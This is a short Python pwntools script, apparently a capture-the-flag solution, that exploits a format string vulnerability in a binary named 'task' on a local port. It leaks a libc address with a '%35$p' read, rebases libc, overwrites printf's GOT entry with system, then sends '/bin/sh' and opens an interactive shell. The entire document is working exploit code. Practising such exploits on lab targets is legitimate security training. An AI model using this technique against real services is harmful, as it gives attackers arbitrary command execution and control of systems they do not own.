#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

p.sendline(b"%35$p")
leak = int(p.readline().decode(), 16)
libc.address = leak - 0x8848b

# fgets - unlike read - cares about '\n' so make sure we exclude this
p.sendline(fmtstr_payload(8, {elf.got["printf"]: libc.sym["system"]}, badbytes=b'\n'))

p.sendline(b"/bin/sh")

p.clean()

p.interactive()
